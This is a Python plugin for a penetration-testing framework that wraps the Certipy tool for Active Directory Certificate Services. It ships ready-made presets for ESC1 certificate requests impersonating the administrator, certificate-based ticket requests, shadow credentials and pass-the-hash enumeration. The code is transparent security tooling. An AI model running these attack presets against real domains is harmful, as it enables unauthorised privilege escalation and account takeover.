#!/usr/bin/env python3
"""
souleyez.plugins.certipy - Active Directory Certificate Services (ADCS) enumeration
"""

import subprocess
import time
from typing import List

from .plugin_base import PluginBase

HELP = {
    "name": "Certipy - ADCS Enumeration & Exploitation",
    "description": (
        "Certipy enumerates and exploits Active Directory Certificate Services.\n\n"
        "Use it for:\n"
        "- Finding vulnerable certificate templates (ESC1-ESC10)\n"
        "- Requesting certificates for privilege escalation\n"
        "- NTLM relay to ADCS (ESC8)\n"
        "- Shadow credentials attacks\n\n"
        "Quick tips:\n"
        "- Use 'find' to enumerate all templates\n"
        "- Use 'req' to request certificates\n"
        "- Use 'auth' to authenticate with certificates\n"
        "- ESC1/ESC4/ESC7/ESC8 are high severity\n"
    ),
    "usage": 'souleyez jobs enqueue certipy <target> --args "find -u <user>@<domain> -p <pass> -dc-ip <dc>"',
    "examples": [
        'souleyez jobs enqueue certipy 10.0.0.82 --args "find -u admin@contoso.local -p Password1 -dc-ip 10.0.0.82"',
        'souleyez jobs enqueue certipy 10.0.0.82 --args "find -u admin@contoso.local -p Password1 -vulnerable"',
        'souleyez jobs enqueue certipy 10.0.0.82 --args "req -u admin@contoso.local -p Password1 -ca CONTOSO-CA -template User"',
        'souleyez jobs enqueue certipy 10.0.0.82 --args "auth -pfx admin.pfx -dc-ip 10.0.0.82"',
    ],
    "flags": [
        ["find", "Enumerate certificate templates and CAs"],
        ["req", "Request a certificate"],
        ["auth", "Authenticate using a certificate"],
        ["shadow", "Shadow credentials attack"],
        ["account", "Manage user/computer accounts"],
        ["-u <user>@<domain>", "Username with domain"],
        ["-p <password>", "Password"],
        ["-H <hash>", "NTLM hash for authentication"],
        ["-dc-ip <ip>", "Domain Controller IP"],
        ["-ca <name>", "Certificate Authority name"],
        ["-template <name>", "Certificate template name"],
        ["-vulnerable", "Only show vulnerable templates"],
        ["-pfx <file>", "PFX certificate file"],
        ["-stdout", "Print output to stdout"],
    ],
    "preset_categories": {
        "enumeration": [
            {
                "name": "Full ADCS Enum",
                "args": [
                    "find",
                    "-u",
                    "<user>@<domain>",
                    "-p",
                    "<pass>",
                    "-dc-ip",
                    "<target>",
                ],
                "desc": "Enumerate all certificate templates and CAs",
            },
            {
                "name": "Vulnerable Templates Only",
                "args": [
                    "find",
                    "-u",
                    "<user>@<domain>",
                    "-p",
                    "<pass>",
                    "-dc-ip",
                    "<target>",
                    "-vulnerable",
                ],
                "desc": "Show only vulnerable templates (ESC1-ESC10)",
            },
            {
                "name": "ADCS Enum (PTH)",
                "args": [
                    "find",
                    "-u",
                    "<user>@<domain>",
                    "-hashes",
                    "<nthash>",
                    "-dc-ip",
                    "<target>",
                ],
                "desc": "Enumerate ADCS with pass-the-hash",
            },
        ],
        "exploitation": [
            {
                "name": "ESC1 - Request Cert as Admin",
                "args": [
                    "req",
                    "-u",
                    "<user>@<domain>",
                    "-p",
                    "<pass>",
                    "-ca",
                    "<ca_name>",
                    "-template",
                    "<template>",
                    "-upn",
                    "administrator@<domain>",
                    "-dc-ip",
                    "<target>",
                ],
                "desc": "Request certificate as another user (ESC1)",
            },
            {
                "name": "Authenticate with Cert",
                "args": ["auth", "-pfx", "<cert.pfx>", "-dc-ip", "<target>"],
                "desc": "Get TGT using certificate",
            },
            {
                "name": "Shadow Credentials",
                "args": [
                    "shadow",
                    "auto",
                    "-u",
                    "<user>@<domain>",
                    "-p",
                    "<pass>",
                    "-account",
                    "<target_user>",
                    "-dc-ip",
                    "<target>",
                ],
                "desc": "Add shadow credentials to target user",
            },
        ],
    },
    "presets": [],
}

# Flatten presets
for category_presets in HELP["preset_categories"].values():
    HELP["presets"].extend(category_presets)

HELP["help_sections"] = [
    {
        "title": "What is Certipy?",
        "color": "cyan",
        "content": [
            {
                "title": "Overview",
                "desc": "Certipy is a tool for enumerating and abusing Active Directory Certificate Services (ADCS) misconfigurations.",
            },
            {
                "title": "ESC Vulnerabilities",
                "desc": "Common ADCS misconfigurations",
                "tips": [
                    "ESC1: Enrollee supplies subject (request as any user)",
                    "ESC2: Any Purpose EKU (use cert for anything)",
                    "ESC3: Certificate Request Agent (enroll for others)",
                    "ESC4: Vulnerable template ACL (modify template)",
                    "ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 (CA misconfiguration)",
                    "ESC7: Vulnerable CA ACL (manage CA)",
                    "ESC8: NTLM relay to ADCS web enrollment",
                ],
            },
        ],
    },
    {
        "title": "How to Use",
        "color": "green",
        "content": [
            {
                "title": "Basic Workflow",
                "desc": "1. Run 'find' to enumerate templates\n     2. Identify vulnerable templates (ESC1-ESC10)\n     3. Request malicious certificate\n     4. Authenticate with certificate to get TGT",
            },
            {
                "title": "Key Commands",
                "desc": "Essential certipy modes",
                "tips": [
                    "find: Enumerate CAs and templates",
                    "req: Request a certificate",
                    "auth: Authenticate with certificate",
                    "shadow: Shadow credentials attack",
                    "-vulnerable: Filter for vulnerable only",
                ],
            },
        ],
    },
]


class CertipyPlugin(PluginBase):
    name = "Certipy"
    tool = "certipy"
    category = "credential_access"
    HELP = HELP

    def check_tool_available(self) -> tuple:
        """Check if certipy is available."""
        import shutil

        # certipy can be installed as 'certipy' or 'certipy-ad'
        tool_path = shutil.which("certipy") or shutil.which("certipy-ad")
        if not tool_path:
            return False, "certipy not found. Install with: pipx install certipy-ad"
        return True, None

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build command for background execution with PID tracking."""
        import shutil

        args = args or []

        # Replace placeholders
        args = [arg.replace("<target>", target) for arg in args]

        # Find the correct binary name
        tool_bin = "certipy" if shutil.which("certipy") else "certipy-ad"

        # Build command
        cmd = [tool_bin]
        cmd.extend(args)

        return {"cmd": cmd, "timeout": 1800}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute certipy and write output to log_path."""
        import shutil

        args = args or []

        # Replace placeholders
        args = [arg.replace("<target>", target) for arg in args]

        # Find the correct binary name
        tool_bin = "certipy" if shutil.which("certipy") else "certipy-ad"

        # Build command
        cmd = [tool_bin]
        cmd.extend(args)

        if not log_path:
            try:
                proc = subprocess.run(
                    cmd, capture_output=True, timeout=600, check=False
                )
                return proc.returncode
            except Exception:
                return 1

        try:
            # Create metadata header
            with open(log_path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(f"=== Plugin: Certipy (ADCS) ===\n")
                fh.write(f"Target: {target}\n")
                fh.write(f"Args: {args}\n")
                fh.write(f"Label: {label}\n")
                fh.write(
                    f"Started: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
                )
                fh.write(f"Command: {' '.join(cmd)}\n\n")

            # Run certipy
            proc = subprocess.run(
                cmd, capture_output=True, timeout=1800, check=False, text=True
            )

            # Write output
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                if proc.stdout:
                    fh.write(proc.stdout)

                if proc.stderr:
                    fh.write(f"\n{proc.stderr}")

                fh.write(
                    f"\n\n=== Completed: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())} ===\n"
                )
                fh.write(f"Exit Code: {proc.returncode}\n")

            return proc.returncode

        except subprocess.TimeoutExpired:
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write("\n\nERROR: certipy timed out after 1800 seconds\n")
            return 124

        except FileNotFoundError:
            with open(log_path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write("ERROR: certipy not found in PATH\n")
                fh.write("Install: pipx install certipy-ad\n")
                fh.write("Or: pip install certipy-ad\n")
            return 127

        except Exception as e:
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(f"\n\nERROR: {type(e).__name__}: {e}\n")
            return 1


plugin = CertipyPlugin()
